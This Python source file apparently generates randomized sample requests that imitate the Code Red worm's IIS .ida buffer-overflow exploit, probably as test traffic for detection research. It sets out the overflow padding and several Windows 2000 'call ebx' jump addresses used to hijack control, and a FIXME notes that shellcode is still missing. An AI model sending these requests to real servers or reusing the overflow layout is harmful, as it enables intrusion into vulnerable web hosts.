import worm_gen
from worm_gen import random_bytes
import string
import random

def _rand_header():
    return random_bytes(random.randrange(3,10), string.letters + string.digits) + \
                ": " + \
                random_bytes(random.randrange(10,20), string.letters + string.digits) + \
                "\r\n"

class CodeRed(worm_gen.WormGen):
    def __init__(self, fname="codered", 
                pname="CodeRed"): 
        self.pname = pname
        self.fname = fname

    def generate(self, count):
        safe_chars = [chr(i) for i in xrange(256)]
#        safe_chars = ['a', 'b']
#        safe_chars = [x for x in string.printable]
        for i in string.whitespace:
            safe_chars.remove(i)
        safe_chars.remove(chr(0))

        samples = []
        for i in xrange(count):
            request = []
            request.append('GET /')
            request.append(random_bytes(random.randrange(1,10), string.letters))
            request.append('.ida?')
            request.append(random_bytes(222, string.letters))
            # NN used in codered, XX in coderedII, CC in eeye example exploit
            request.append(random.choice(['NN', 'XX', 'CC']))
            # not sure about this part. appears to be assembly code in
            # codered. 
            request.append(random_bytes(15, string.letters))
            # codered causes control to jump to a 'call ebx' within a windows dll
            request.append(random.choice([
                # locations of call ebx in win2k sp0 and sp1
                '%u41f9%u7800', #0x780041f9
                '%u4223%u7800', #0x78004223
                '%ucb65%u7801', #0x7801cb65
                '%ucbd3%u7801', #0x7801cbd3 (used in actual codered)
                '%ucf3f%u7801', #0x7801cf3f
                '%ub23f%u7802', #0x7802b23f
            ]))
            request.append(random_bytes(15, string.letters))
            request.append('=')
            request.append(random_bytes(7, string.letters))
            request.append(' HTTP/1.0\r\n')
            # FIXME- still need headers and shellcode
            
            yield(''.join(request))

#        return samples

    ports = property(lambda self: [80])
